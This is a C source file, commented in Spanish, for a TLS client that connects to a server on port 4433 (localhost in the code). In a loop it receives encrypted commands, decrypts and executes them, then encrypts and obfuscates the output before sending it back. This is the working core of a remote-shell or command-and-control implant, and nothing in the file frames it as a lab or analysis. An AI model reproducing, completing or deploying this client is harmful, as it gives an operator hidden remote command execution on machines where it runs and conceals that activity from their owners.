#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include "crypto.h"

#define PORT 4433

int main() {
    SSL *ssl;
    SSL_CTX *ctx;
    int server_fd;
    char buf[1024];

    // Inicializa OpenSSL
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();

    // Crea un contexto SSL/TLS
    ctx = SSL_CTX_new(SSLv23_client_method());
    if (ctx == NULL) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    // Crea un socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Unable to create socket");
        exit(EXIT_FAILURE);
    }

    // Configura la dirección del servidor
    struct sockaddr_in server_addr = {
        .sin_family = AF_INET,
        .sin_port = htons(PORT),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };

    // Conecta al servidor
    if (connect(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Unable to connect");
        close(server_fd);
        SSL_CTX_free(ctx);
        ERR_free_strings();
        EVP_cleanup();
        exit(EXIT_FAILURE);
    }

    // Crea una estructura SSL y la asocia con el socket
    ssl = SSL_new(ctx);
    SSL_set_fd(ssl, server_fd);

    // Establece la conexión SSL/TLS
    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    printf("SSL/TLS handshake successful. Connected to server.\n");

    // Bucle para recibir el comando del servidor y enviar el resultado cifrado
    while (1) {
        // Espera y recibe el comando cifrado del servidor
        memset(buf, 0, sizeof(buf));
        int bytes_received = SSL_read(ssl, buf, sizeof(buf));
        if (bytes_received <= 0) {
            // Error o conexión cerrada por el servidor
            ERR_print_errors_fp(stderr);
            break;
        }

        // Descifra el comando recibido del servidor antes de ejecutarlo
        char decryptedCommand[1024];
        encryptDecrypt(buf, decryptedCommand, strlen(buf) + 1);
        printf("Received command from server: %s\n", decryptedCommand);

        // Ejecuta el comando y obtiene el resultado
        char *result = executeCommand(decryptedCommand);

        // Cifra y obfusca el resultado del comando antes de enviarlo
        encryptDecrypt(result, buf, strlen(result) + 1);
        SSL_write(ssl, buf, strlen(buf) + 1);

        // Libera la memoria asignada para el resultado del comando
        free(result);
    }

    // Cierra la conexión SSL/TLS y el socket
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(server_fd);

    // Limpia y libera recursos de OpenSSL
    SSL_CTX_free(ctx);
    ERR_free_strings();
    EVP_cleanup();

    return 0;
}
